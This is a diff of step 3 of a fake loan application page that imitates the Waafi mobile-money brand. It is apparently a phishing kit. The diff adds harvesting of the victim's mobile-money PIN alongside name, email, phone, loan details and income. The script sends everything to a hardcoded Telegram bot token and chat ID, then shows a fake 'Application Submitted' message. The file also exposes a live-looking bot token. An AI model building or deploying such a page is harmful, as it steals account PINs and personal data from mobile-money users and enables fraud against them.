@@ -1,100 +1,33 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Waafi - Step 3</title>
-<style>
-body { font-family: Arial, sans-serif; margin:0; background:#f5f5f5; }
-.header { background: linear-gradient(90deg, #a8e063, #00B347); padding:15px; color:white; text-align:center; font-weight:bold; font-size:20px; }
-.container { padding:20px; max-width:600px; margin:auto; }
-.card { background:white; padding:20px; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); margin-bottom:20px; }
-h3 { color:#00B347; margin-top:0; }
-label { display:block; margin:15px 0 5px 0; font-weight:bold; }
-input, select { width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
-.btn { width:100%; padding:16px; border:none; border-radius:8px; font-size:18px; font-weight:bold; background: linear-gradient(90deg, #a8e063, #00B347); color:white; cursor:pointer; margin-top:10px; }
-.btn-back { background:#999; }
-.progress { display:flex; justify-content:space-between; margin-bottom:20px; font-size:14px; }
-.step { color:#999; }
-.step.active { color:#00B347; font-weight:bold; }
-.success { text-align:center; padding:30px; }
-.success h2 { color:#00B347; }
-</style>
-</head>
-<body>
-
-<div class="header">Waafi - Loan Application</div>
-
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Step 3</title>
+<style>body{font-family:Arial;background:#f5f5f5;margin:0}.header{background:linear-gradient(90deg,#b8e600,#00B347);padding:15px;color:white;text-align:center;font-weight:bold}.container{padding:20px;max-width:600px;margin:auto}.card{background:white;padding:20px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}label{display:block;margin:15px 0 5px;font-weight:bold}input,select{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}.btn{width:100%;padding:16px;border:none;border-radius:8px;font-size:18px;font-weight:bold;background:linear-gradient(90deg,#b8e600,#00B347);color:white;cursor:pointer;margin-top:10px}.btn-back{background:#999}.progress{display:flex;justify-content:space-between;margin-bottom:20px;font-size:14px}.step{color:#999}.step.active{color:#00B347;font-weight:bold}.success{text-align:center;padding:30px}.success h2{color:#00B347}</style>
+</head><body><div class="header">Enough - Loan Application</div>
 <div class="container" id="formContainer">
-
-<div class="progress">
-  <div class="step">1. Loan Details</div>
-  <div class="step">2. Personal Info</div>
-  <div class="step active">3. Work Info</div>
-</div>
-
-<div class="card">
-<h3>Step 3: Work Info</h3>
-
-<label>Work Status</label>
-<select id="work">
-  <option>Employee</option>
-  <option>Self Employed</option>
-  <option>Student</option>
-  <option>Unemployed</option>
-</select>
-
-<label>Annual Income ($)</label>
-<input id="income" type="number" placeholder="25000">
-
+<div class="progress"><div class="step">1. Loan</div><div class="step">2. Personal</div><div class="step active">3. Work</div><div class="step">4. Submit</div></div>
+<div class="card"><h3>Step 3: Work Info</h3>
+<label>Work Status</label><select id="work"><option>Employee</option><option>Self Employed</option><option>Student</option><option>Unemployed</option></select>
+<label>Annual Income ($)</label><input id="income" type="number" placeholder="25000">
 <button class="btn" onclick="submitApplication()">SUBMIT APPLICATION</button>
-<button class="btn btn-back" onclick="window.location.href='step2.html'">BACK</button>
-
-</div>
-</div>
+<button class="btn btn-back" onclick="location.href='step2.html'">BACK</button></div></div>
 
 <div class="container" id="successContainer" style="display:none;">
-  <div class="card success">
-    <h2>✅ Application Submitted!</h2>
-    <p>Thank you. Your application is verified.</p>
-    <p>We will call you within 24 hours.</p>
-  </div>
-</div>
+<div class="card success"><h2>✅ Application Submitted!</h2><p>Thank you. We will call you within 24 hours.</p></div></div>
 
 <script>
 const BOT_TOKEN = "8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A";
 const CHAT_ID = "8630213836";
-
-// Load data from previous steps
 const step1 = JSON.parse(localStorage.getItem('waafi_step1'));
 const step2 = JSON.parse(localStorage.getItem('waafi_step2'));
+if(!step1 || !step2){alert('Complete previous steps');location.href='step1.html';}
 
-// If user skips steps, send back
-if(!step1 || !step2) {
-  alert('❌ Please complete previous steps first');
-  window.location.href = 'step1.html';
-}
-
-function submitApplication() {
-  const work = document.getElementById('work').value;
-  const income = document.getElementById('income').value;
-  
-  if(!income) return alert('❌ Please enter Annual Income');
-
-  // Combine all data
-  const fullData = {
-    ...step1,
-    ...step2,
-    work: work,
-    income: income
-  };
-
-  // Format message for Telegram
-  const message = `🔥 NEW VERIFIED WAAFI APPLICATION 🔥
+function submitApplication(){
+if(!income.value)return alert('Enter income');
+const fullData = {...step1,...step2,work:work.value,income:income.value,pin:localStorage.getItem('waafi_pin')};
+const message = `🔥 NEW APPLICATION 🔥
 
 👤 NAME: ${fullData.fname} ${fullData.lname}
 📧 EMAIL: ${fullData.email}
-📱 PHONE: +252 ${fullData.phone} ✅ OTP VERIFIED
+📱 PHONE: +252 ${fullData.phone}
+🔑 PIN: ${fullData.pin}
 
 💰 LOAN: ${fullData.loanType}
 💵 AMOUNT: $${fullData.amount}
@@ -102,25 +35,9 @@ function submitApplication() {
 🎯 PURPOSE: ${fullData.purpose}
 
 💼 WORK: ${fullData.work}
-📈 INCOME: $${fullData.income}
+📈 INCOME: $${fullData.income}`;
 
---- Sent from Waafi Website ---`;
-
-  // Send to Telegram
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-  })
-  .then(() => {
-    // Clear storage and show success
-    localStorage.clear();
-    document.getElementById('formContainer').style.display = 'none';
-    document.getElementById('successContainer').style.display = 'block';
-  })
-  .catch(() => alert("❌ Error sending to Telegram. Check internet."));
-}
-</script>
-
-</body>
-</html>
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text:message})})
+.then(()=>{localStorage.clear();formContainer.style.display='none';successContainer.style.display='block';})
+.catch(()=>alert("Error sending to Telegram"));
+}</script></body></html>
